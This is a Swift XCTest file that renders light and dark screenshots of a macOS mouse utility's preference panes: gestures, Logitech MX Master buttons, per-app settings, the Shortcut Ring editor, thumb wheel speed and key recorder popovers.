/// the mouse holds the pointer itself (on, dimmed, with the reason), while it does so for
/// some of the buttons only, and the pane without a Logitech mouse (it ends with
/// "Behavior": no line asks for one); the same switch of an app's own gestures; and the
/// Buttons pane's free Gesture button and Thumb panel saying what they are good for.
extension PreferencesWindowRenderTests {

    func testRenderRound4D2Gestures() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock {
            Options.shared.application.applications = stored
            ButtonUtils.shared.invalidateCache()
        }
        let master4 = MouseGestureDeviceSupport(deviceTracking: true, haptics: true)
        let action = SystemShortcut.mouseGestureNavigation.identifier
        let tracked = round2Binding(LogiCenter.shared.scrollioCode(for: .gesture), action)
        let back = round2Binding(3, action)
        var tracking = MouseGestureSettings.default
        tracking.deviceTracking = true
        tracking.freezePointer = false

        let cases: [(name: String, settings: MouseGestureSettings, support: MouseGestureDeviceSupport, bindings: [ButtonBinding],
                     titles: [String], holder: MouseGesturePointerHolder)] = [
            ("mouse-holds", tracking, master4, [tracked], ["Gesture button"], .mouse),
            ("some", tracking, master4, [tracked, back], ["Gesture button", "Back button"], .mouseForSome),
            ("no-logitech", .default, .none, [back], ["Back button"], .scrollio),
        ]
        for item in cases {
            Options.shared.gesture = item.settings
            var pane: GesturesPreferencesViewController?
            try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "round4-d2-gestures-\(item.name)", replacement: {
                let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
                gestures.deviceSource = MouseGestureDeviceSource(support: { item.support }, refresh: {})
                gestures.gestureBindingSets = { [item.bindings] }
                gestures.holdKeysThatCatch = { [] }
                gestures.bindingSummary = {
                    MouseGestureBindingSummary(
                        hasGestureButton: true, hasLogitechGestureButton: item.support.deviceTracking, buttonTitles: item.titles,
                        picture: self.gesturePicture(logitech: item.support.deviceTracking)
                    )
                }
                return gestures
            }, afterLoad: { controller in
                guard let gestures = controller as? GesturesPreferencesViewController else { return }
                pane = gestures
                gestures.previewView.prefersReducedMotion = { true }
                gestures.previewView.reduceMotionDidChange()
                if item.support.deviceTracking {
                    gestures.previewView.mouseSource = { .mxMaster4 }
                    gestures.previewView.reloadMouse()
                }
            })
            let shown = try XCTUnwrap(pane)
            XCTAssertEqual(shown.pointerHolder, item.holder, item.name)
            XCTAssertEqual(shown.freezeRow.isEnabled, item.holder != .mouse, item.name)
            XCTAssertEqual(MouseGestureSettingsControls.isOn(shown.controls.freezeToggle), item.name != "some", item.name)
            XCTAssertEqual(shown.logitechSection.isHidden, !item.support.deviceTracking, item.name)
            XCTAssertEqual(Options.shared.gesture, item.settings, "\(item.name): drawing stores nothing")
        }

        // Safari's own gestures on an MX Master 4, its own "Let the mouse track the gesture"
        // on and its own Freeze stored off: the same row in Safari › Gestures.
        Options.shared.gesture = .default
        Options.shared.buttons.binding = [tracked]
        let safari = Application(path: "/Applications/Safari.app")
        safari.setUsesGeneralGestures(false, general: .default)
        safari.changeOwnGestures {
            $0.deviceTracking = true
            $0.freezePointer = false
        }
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
        ButtonUtils.shared.invalidateCache()
        let defaults = uiDefaults(advanced: false)
        var part: ApplicationGesturesPartViewController?
        try renderPane(PANEL_IDENTIFIER.application, name: "round4-d2-app-gestures-mouse-holds", prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            let apps = controller as? PreferencesApplicationViewController
            apps?.openApplication(withID: safari.path, part: .gestures)
            part = apps?.detailController?.gesturesPart
            part?.deviceSource = MouseGestureDeviceSource(support: { master4 }, refresh: {})
            part?.isInteractiveAvailable = { true }
            part?.holdKeysThatCatch = { [] }
            part?.syncViewWithOptions()
        })
        let own = try XCTUnwrap(part)
        XCTAssertEqual(own.pointerHolder, .mouse)
        XCTAssertEqual(own.freezeRow?.isEnabled, false)
        XCTAssertEqual(safari.ownGestures?.freezePointer, false)
    }

    /// Buttons on an MX Master 4 with nothing set up (both rows name Gestures and the
    /// Shortcut Ring), with the Gesture button's row selected, with the Gesture button
    /// running the gestures (the Thumb panel names the ring), and an MX Master 3S with
    /// nothing set up (its Gesture button's row).
    func testRenderRound4D2Buttons() throws {
        let gesture = LogiCenter.shared.scrollioCode(for: .gesture)
        let both = "Good for Gestures or the Shortcut Ring."
        Options.shared.buttons.binding = []
        for selected in [false, true] {
            try renderButtons(name: "round4-d2-buttons-mx4-free" + (selected ? "-selected" : ""), source: round2Source("MX Master 4")) { buttons in
                buttons.holdKeysThatCatch = { [] }
                buttons.reload()
                XCTAssertEqual(buttons.row(for: ButtonsMousePart.gesture)?.explanation, both)
                XCTAssertEqual(buttons.row(for: ButtonsMousePart.thumbPanel)?.explanation, both)
                if selected {
                    buttons.list.select(ButtonsMousePart.gesture)
                }
            }
        }
        try renderButtons(name: "round4-d2-buttons-mx3s-free", source: round2Source("MX Master 3S")) { buttons in
            buttons.holdKeysThatCatch = { [] }
            buttons.reload()
            XCTAssertEqual(buttons.row(for: ButtonsMousePart.gesture)?.explanation, both)
        }
        Options.shared.buttons.binding = [round2Binding(gesture, SystemShortcut.mouseGestureNavigation.identifier)]
        try renderButtons(name: "round4-d2-buttons-mx4-gestures-taken", source: round2Source("MX Master 4")) { buttons in
            buttons.holdKeysThatCatch = { [] }
            buttons.reload()
            XCTAssertEqual(buttons.row(for: ButtonsMousePart.thumbPanel)?.explanation, "Good for the Shortcut Ring.")
        }
    }
}

// MARK: - Round 4 D4

extension PreferencesWindowRenderTests {

    /// "Different in Safari and Figma", the last line of four panes
    /// (`r4-d4-<case>-<appearance>.png`, each the end of its pane): Scrolling with no app
    /// that differs (as before) and with one; Buttons with two; Gestures with three, in one
    /// row and with long names in two; the Shortcut Ring with five (icons, "and 3 more")
    /// and with three long names (icons, two rows). `r4-d4-ring-five-pane` and
    /// `r4-d4-buttons-two-pane` are the whole panes.
    func testRenderRound4D4DifferentInApps() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        defer {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        Options.shared.application.allowlist = false
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.missionControl.identifier),
            binding(4, SystemShortcut.copy.identifier, modifiers: UInt(CGEventFlags.maskAlternate.rawValue)),
        ]
        ButtonUtils.shared.invalidateCache()
        let long = "Microsoft Visual Studio Code Insiders Edition With A Very Long Name"

        /// The list holds apps named `names` (a path names itself), each with settings of
        /// `part`'s kind of its own.
        func list(_ names: [String], own part: ApplicationPagePart?) {
            let applications = names.map { name -> Application in
                let isPath = name.hasPrefix("/")
                let application = Application(path: isPath ? name : "/Applications/Round 4 D4/\(name).app")
                if !isPath {
                    application.displayName = name
                }
                switch part?.id {
                case ApplicationPagePart.scrolling.id: application.inherit = false
                case ApplicationPagePart.buttons.id: application.setOwnButtonBindings([self.binding(5, SystemShortcut.paste.identifier)])
                case ApplicationPagePart.gestures.id: application.setUsesGeneralGestures(false, general: Options.shared.gesture)
                case ApplicationPagePart.ring.id: application.setUsesGeneralRing(false, general: Options.shared.ring)
                default: break
                }
                return application
            }
            Options.shared.application.applications = EnhanceArray<Application>(withArray: applications, matchKey: "path")
        }
        let defaults = uiDefaults(advanced: false)
        let prepare: (PreferencesSplitViewController) -> Void = { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?.uiStateDefaults = defaults
            (preferences.controller(for: PANEL_IDENTIFIER.buttons) as? PreferencesButtonsViewController)?.deviceSource = ButtonsDeviceSource(
                captureStatus: { _ in .normal }, deviceName: { nil }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
            )
            (preferences.controller(for: GesturesPreferencesViewController.tabIdentifier) as? GesturesPreferencesViewController)?
                .deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
            (preferences.controller(for: RingPreferencesViewController.tabIdentifier) as? RingPreferencesViewController)?
                .bindingSummary = { ShortcutRingBindingSummary(triggerTitles: []) }
        }
        let system = "/System/Applications/"
        let five = ["/Applications/Safari.app", system + "Calculator.app", system + "TextEdit.app", system + "Notes.app", system + "Maps.app"]

        list([system + "Calculator.app"], own: nil)
        try round4D4End(PANEL_IDENTIFIER.scrolling, name: "r4-d4-scrolling-none", prepare: prepare)
        list([system + "Calculator.app"], own: .scrolling)
        try round4D4End(PANEL_IDENTIFIER.scrolling, name: "r4-d4-scrolling-one", prepare: prepare)

        list([system + "Calculator.app", system + "TextEdit.app"], own: .buttons)
        try round4D4End(PANEL_IDENTIFIER.buttons, name: "r4-d4-buttons-two", prepare: prepare)
        try renderPane(PANEL_IDENTIFIER.buttons, name: "r4-d4-buttons-two-pane", prepare: prepare)

        list(["Safari", "Figma", "Xcode"], own: .gestures)
        try round4D4End(GesturesPreferencesViewController.tabIdentifier, name: "r4-d4-gestures-three", prepare: prepare)
        list([long, "Adobe Illustrator 2026 (Beta) With Its Long Name", "Final Cut Pro Trial"], own: .gestures)
        try round4D4End(GesturesPreferencesViewController.tabIdentifier, name: "r4-d4-gestures-three-long", prepare: prepare)

        list(five, own: .ring)
        try round4D4End(RingPreferencesViewController.tabIdentifier, name: "r4-d4-ring-five", prepare: prepare)
        try renderPane(RingPreferencesViewController.tabIdentifier, name: "r4-d4-ring-five-pane", prepare: prepare)
        list(Array(five.prefix(2)), own: .ring)
        try round4D4End(RingPreferencesViewController.tabIdentifier, name: "r4-d4-ring-two", prepare: prepare)
        list([long, "Adobe Illustrator 2026 (Beta) With Its Long Name", "Another App With A Name That Is Cut Short"], own: .ring)
        try round4D4End(RingPreferencesViewController.tabIdentifier, name: "r4-d4-ring-three-long", prepare: prepare)
    }

    /// Writes `<name>-light.png` and `<name>-dark.png`: the last `tail` points of the pane
    /// `identifier`, cut from the whole window as `renderPane` cuts the column.
    private func round4D4End(
        _ identifier: String, name: String, tail: CGFloat = 130,
        prepare: @escaping (PreferencesSplitViewController) -> Void
    ) throws {
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let (window, preferences) = try makeWindow(appearance: appearanceName, prepare: prepare)
            XCTAssertTrue(preferences.selectPane(withIdentifier: identifier), identifier)
            let controller = try XCTUnwrap(preferences.host.currentController)
            let content = try XCTUnwrap(window.contentView)
            content.layoutSubtreeIfNeeded()
            let top = preferences.host.view.safeAreaInsets.top
            let paneHeight = max(controller.view.frame.height, controller.view.fittingSize.height)
            let height = max(PreferencesWindowLayout.defaultContentHeight, ceil(paneHeight + top))
            window.setContentSize(NSSize(width: content.frame.width, height: height))
            content.layoutSubtreeIfNeeded()
            let pane = controller.view.convert(controller.view.bounds, to: content)
            let cut = min(tail, pane.height)
            let rect = NSRect(x: pane.minX, y: content.isFlipped ? pane.maxY - cut : pane.minY, width: pane.width, height: cut)
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            try write(content, rect: rect, appearance: appearance, to: directory.appendingPathComponent("\(name)-\(suffix).png"))
        }
    }
}

// MARK: - Round 4 D6

extension PreferencesWindowRenderTests {

    /// The ring's drawing as an editor (`r4-d6-<case>-<appearance>.png`). `pane-menu-at-drop`
    /// and `app-page-menu-at-drop`: the pane, and Calculator's own ring on its page, as they
    /// stand while a place's menu is open at its drop: the place lit, its row's title tinted
    /// and the row's pull-down showing its action although the menu's title item is hidden.
    /// The red circles are drawn by this test: the views over the drops that the recorder,
    /// the name and icon and "Open App or File…" stand at. AppKit's menus cannot be drawn
    /// off screen: `menu-secondary`, `menu-swap-with` and `menu-own` are their items (the
    /// secondary click's two, the seven places of "Swap With" from "Top", and a place's own
    /// menu, which ends with "Swap With"), drawn by the test.
    func testRenderRound4D6() throws {
        let savedRing = Options.shared.ring
        let stored = Options.shared.application.applications
        addTeardownBlock {
            Options.shared.ring = savedRing
            Options.shared.application.applications = stored
            ShortcutRingController.forgetPreparedFaces()
        }
        var ring = ShortcutRingSettings.default
        ring[5] = ShortcutRingPlace(
            action: "custom::1:1048576", label: ShortcutLabel(name: "Save All", icon: .symbol("square.and.arrow.down"))
        )
        ring[6] = .empty
        Options.shared.ring = ring

        func standAtDrop(_ controller: RingPreferencesViewController?, place: Int) {
            guard let controller else { return }
            controller.presentPlaceMenu = { _, _, _ in }
            controller.openMenu(forPlace: place)
            controller.placePopUps[place].menu?.items.first?.isHidden = true
            for other in 0..<ShortcutRingSettings.placeCount {
                let anchor = controller.previewView.anchor(forPlace: other)
                let outline = Round4D6Outline(frame: anchor.bounds)
                outline.autoresizingMask = [.width, .height]
                anchor.addSubview(outline)
            }
        }

        let thumbPanel = RecordedEvent(type: .mouse, code: LogiCenter.shared.scrollioCode(for: .thumbPanel), modifiers: 0, deviceFilter: nil)
        try renderPane(RingPreferencesViewController.tabIdentifier, name: "r4-d6-pane-menu-at-drop", titled: TitledCut(), replacement: {
            let pane = RingPreferencesViewController()
            pane.bindingSummary = {
                ShortcutRingBindingSummary(triggerTitles: ["Thumb panel"], picture: TriggerPictureSource(event: thumbPanel))
            }
            return pane
        }, afterLoad: { controller in
            guard let pane = controller as? RingPreferencesViewController else { return }
            Self.stillTriggerCard(of: pane, mouse: .mxMaster4)
            standAtDrop(pane, place: 1)
        })

        let calculator = Application(path: "/System/Applications/Calculator.app")
        calculator.setUsesGeneralRing(false, general: ring)
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
        let defaults = uiDefaults(advanced: false)
        try renderPane(PANEL_IDENTIFIER.application, name: "r4-d6-app-page-menu-at-drop", prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            let apps = controller as? PreferencesApplicationViewController
            apps?.openApplication(withID: calculator.path, part: .ring)
            standAtDrop(apps?.detailController?.ringController, place: 5)
        })

        /// The items as the stand-in draws them: a disabled one dimmed, a submenu's chevron.
        func standIns(_ items: [NSMenuItem]) -> [NSMenuItem] {
            return items.map { item in
                if item.isSeparatorItem { return .separator() }
                let copy = NSMenuItem(title: item.title, action: item.isEnabled ? #selector(NSObject.description) : nil, keyEquivalent: "")
                copy.image = item.image
                copy.state = item.state
                if item.submenu != nil {
                    copy.submenu = NSMenu()
                }
                return copy
            }
        }
        let pane = RingPreferencesViewController()
        pane.bindingSummary = { ShortcutRingBindingSummary(triggerTitles: ["Thumb panel"]) }
        _ = pane.view
        let secondary = try XCTUnwrap(pane.contextMenu(forPlace: 0))
        try renderMenuStandIn(standIns(secondary.items), name: "r4-d6-menu-secondary")
        let swapWith = try XCTUnwrap(secondary.items.first?.submenu)
        swapWith.delegate?.menuNeedsUpdate?(swapWith)
        try renderMenuStandIn(standIns(swapWith.items), name: "r4-d6-menu-swap-with")
        let own = try XCTUnwrap(pane.placePopUps[0].menu)
        pane.placePopUps[0].menuWillOpen(own)
        try renderMenuStandIn(standIns(Array(own.items.dropFirst().filter { !$0.isHidden })), name: "r4-d6-menu-own")
    }
}

/// A red circle, for a picture that shows where something stands.
private final class Round4D6Outline: NSView {
    override func draw(_ dirtyRect: NSRect) {
        NSColor.systemRed.setStroke()
        let circle = NSBezierPath(ovalIn: bounds.insetBy(dx: 0.5, dy: 0.5))
        circle.lineWidth = 1
        circle.stroke()
    }
}

// MARK: - Thumb wheel speed per action

extension PreferencesWindowRenderTests {

    /// The Thumb wheel box with a Speed for each action (`tw-speed-<case>-<appearance>.png`),
    /// cut from the pane with the line under it. `scroll` and `desktops` are Scrolling ›
    /// Thumb wheel with the SAME settings, only the action chosen differs: Scroll Sideways
    /// at 1.0×, Switch Desktops (Follow the wheel on) at 0.7×, each with its own line under
    /// Speed. `app-zoom` is Safari › Scrolling with Own Settings: Safari's own action, Zoom,
    /// at Safari's own 2.5×.
    func testRenderThumbWheelSpeedPerAction() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        var settings = ThumbWheelSettings(function: .scroll)
        settings.speeds[.desktops] = 0.7
        settings.followsWheel = true

        func cut(_ name: String, pane identifier: String, afterLoad: (NSViewController) -> Void = { _ in },
                 box: (NSViewController) -> PreferencesScrollingViewController?) throws {
            let defaults = uiDefaults(advanced: false)
            for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
                let (window, preferences) = try makeWindow(appearance: appearanceName) { preferences in
                    (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?
                        .uiStateDefaults = defaults
                    (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                        .uiStateDefaults = defaults
                }
                XCTAssertTrue(preferences.selectPane(withIdentifier: identifier), identifier)
                let controller = try XCTUnwrap(preferences.host.currentController)
                afterLoad(controller)
                let content = try XCTUnwrap(window.contentView)
                content.layoutSubtreeIfNeeded()
                // Tall enough for the whole pane, so the box is never cut by the window.
                let top = preferences.host.view.safeAreaInsets.top
                let paneHeight = max(controller.view.frame.height, controller.view.fittingSize.height)
                let height = max(PreferencesWindowLayout.defaultContentHeight, ceil(paneHeight + top))
                window.setContentSize(NSSize(width: content.frame.width, height: height))
                content.layoutSubtreeIfNeeded()
                let scrolling = try XCTUnwrap(box(controller))
                let section = try XCTUnwrap(scrolling.thumbWheelSection)
                let note = try XCTUnwrap(scrolling.thumbWheelNote)
                let rect = section.convert(section.bounds, to: content)
                    .union(note.convert(note.bounds, to: content))
                    .insetBy(dx: -16, dy: -12)
                    .intersection(content.bounds)
                let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
                try write(content, rect: rect, appearance: appearance, to: directory.appendingPathComponent("tw-speed-\(name)-\(suffix).png"))
            }
        }

        settings.function = .scroll
        Options.shared.thumbWheel = settings
        try cut("scroll", pane: PANEL_IDENTIFIER.scrolling) { $0 as? PreferencesScrollingViewController }
        settings.function = .desktops
        Options.shared.thumbWheel = settings
        try cut("desktops", pane: PANEL_IDENTIFIER.scrolling) { $0 as? PreferencesScrollingViewController }

        // Safari with its own settings and its own action: Zoom at its own 2.5×, while
        // Scrolling's Zoom stays at 1.0× and the wheel switches desktops in other apps.
        let safari = Application(path: "/Applications/Safari.app")
        safari.setUsesScrollingSettings(false, scrolling: Options.shared.scroll, thumbWheel: settings)
        safari.setOwnThumbWheelFunction(.zoom)
        var own = safari.thumbWheelThatRuns(general: settings)
        own.speed = 2.5
        safari.setOwnThumbWheelScrolling(own)
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
        try cut("app-zoom", pane: PANEL_IDENTIFIER.application, afterLoad: { controller in
            (controller as? PreferencesApplicationViewController)?.openApplication(withID: safari.path, part: .scrolling)
        }, box: { controller in
            (controller as? PreferencesApplicationViewController)?.detailController?.scrollingController
        })
    }
}

// MARK: - QA fix F4

extension PreferencesWindowRenderTests {

    /// The first row of the Shortcut Ring and Gestures panes with long names
    /// (`qa-f4-<case>-<appearance>.png`, whole panes). Shortcut Ring: a short name with the
    /// whole line; a long name whole, with the short line; a name longer than any real one,
    /// cut short in the pull-down; only in two apps with long names, cut to two lines; only
    /// in an app with a key combination (no "A key combination works too."). Gestures:
    /// only in four apps with different buttons, two named and two counted.
    func testRenderQAFixF4TriggerRows() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        defer {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        Options.shared.buttons.binding = []
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [], matchKey: "path")
        ButtonUtils.shared.invalidateCache()

        func ring(_ summary: ShortcutRingBindingSummary) -> (PreferencesSplitViewController) -> Void {
            return { preferences in
                (preferences.controller(for: RingPreferencesViewController.tabIdentifier) as? RingPreferencesViewController)?
                    .bindingSummary = { summary }
            }
        }
        let pane = RingPreferencesViewController.tabIdentifier
        try renderPane(pane, name: "qa-f4-ring-short-name", prepare: ring(ShortcutRingBindingSummary(triggerTitles: ["Back button"])))
        try renderPane(pane, name: "qa-f4-ring-long-name", prepare: ring(ShortcutRingBindingSummary(triggerTitles: ["Gesture button (button 6)"])))
        try renderPane(pane, name: "qa-f4-ring-endless-name", prepare: ring(ShortcutRingBindingSummary(
            triggerTitles: ["⌃⌥⇧⌘ Gesture button of the left hand (button 16)"]
        )))
        let long = ["DaVinci Resolve Studio", "Adobe Premiere Pro 2026", "Microsoft Visual Studio Code Insiders", "Final Cut Pro Trial"]
        try renderPane(pane, name: "qa-f4-ring-only-in-long", prepare: ring(ShortcutRingBindingSummary(
            triggerTitles: [],
            onlyInApps: ApplicationTriggers(applicationNames: Array(long.prefix(2)), triggerTitles: ["Thumb panel"], ownOnly: .shortcutRing)
        )))
        try renderPane(pane, name: "qa-f4-ring-only-in-key", prepare: ring(ShortcutRingBindingSummary(
            triggerTitles: [],
            onlyInApps: ApplicationTriggers(applicationNames: ["Figma"], triggerTitles: ["⌃⌥ Space"], namesAKey: true)
        )))

        let four = ApplicationTriggers(
            applicationNames: long, triggerTitles: ["Thumb panel", "Back button", "Gesture button (button 6)", "Forward button"],
            ownOnly: .gestureNavigation,
            appTriggerTitles: [["Thumb panel"], ["Back button"], ["Gesture button (button 6)"], ["Forward button"]]
        )
        try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "qa-f4-gestures-only-in-four", prepare: { preferences in
            let gestures = preferences.controller(for: GesturesPreferencesViewController.tabIdentifier) as? GesturesPreferencesViewController
            gestures?.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
            gestures?.bindingSummary = {
                MouseGestureBindingSummary(hasGestureButton: false, hasLogitechGestureButton: false, onlyInApps: four)
            }
        })
    }
}

// MARK: - QA fix F2

/// QA fix F2 (`qafix-f2-*-<appearance>.png`): the recorder's popover where nothing can be
/// recorded (no Accessibility access, or the tap could not be made: B6, X7), its small line
/// while Scrollio is paused, for a listed button without an action and for a row's own
/// button (B1); and Buttons on an MX Master 4 with the shortened lines of the ring and of a
/// key that has Gesture Navigation, each in two lines (B7).
extension PreferencesWindowRenderTests {

    func testRenderQAFixF2Recorder() throws {
        func text(_ key: String) -> String {
            return NSLocalizedString(key, comment: "")
        }
        func render(_ popover: KeyPopover, _ name: String) throws {
            let view = try XCTUnwrap(popover.testingContentView)
            view.layoutSubtreeIfNeeded()
            view.setFrameSize(view.fittingSize)
            try renderInPopoverMaterial(view, name: "qafix-f2-recorder-\(name)")
            popover.hide()
        }
        // (A view without a window: the popover's content is made, nothing opens.)
        let anchor = NSView(frame: NSRect(x: 0, y: 0, width: 24, height: 22))
        let notices = [
            ("no-access", "status-menu-title-needs-access", "key-recorder-needs-access-hint"),
            ("could-not-start", "key-recorder-could-not-start", "key-recorder-try-again"),
        ]
        for (name, title, detail) in notices {
            let popover = KeyPopover()
            popover.announce = { _ in }
            popover.showNotice(at: anchor, title: text(title), detail: text(detail))
            try render(popover, name)
        }
        let lines: [(name: String, keys: [String], status: KeyPreview.Status, hint: String)] = [
            ("paused", [KeyPreview.WAITING_WORDING], .recording, text("key-recorder-paused")),
            ("in-list", ["Gesture button"], .duplicate, text("buttons-recorder-in-list")),
            ("own-button", ["Back button"], .duplicate, text("buttons-recorder-own-button")),
        ]
        for line in lines {
            let popover = KeyPopover()
            popover.announce = { _ in }
            popover.testingPrepareContent(waitingHint: KeyRecordingMode.combination.waitingHint)
            popover.keyPreview.update(from: line.keys, status: line.status)
            popover.showRefusalHint(line.hint)
            try render(popover, line.name)
        }
    }

    func testRenderQAFixF2ButtonsNotes() throws {
        let ring = SystemShortcut.shortcutRing.identifier
        let gestures = SystemShortcut.mouseGestureNavigation.identifier
        Options.shared.buttons.binding = [
            round2Binding(LogiCenter.shared.scrollioCode(for: .gesture), ring),
            round2Binding(3, gestures),
            round2Binding(49, ring, modifiers: .maskControl, type: .keyboard),
            round2Binding(41, gestures, modifiers: .maskCommand, type: .keyboard),
        ]
        try renderButtons(name: "qafix-f2-buttons-notes", source: round2Source("MX Master 4")) { buttons in
            XCTAssertEqual(buttons.row(for: ButtonsMousePart.gesture)?.explanation, "Opens the ring. Set its shortcuts under Shortcut Ring.")
        }
    }
}
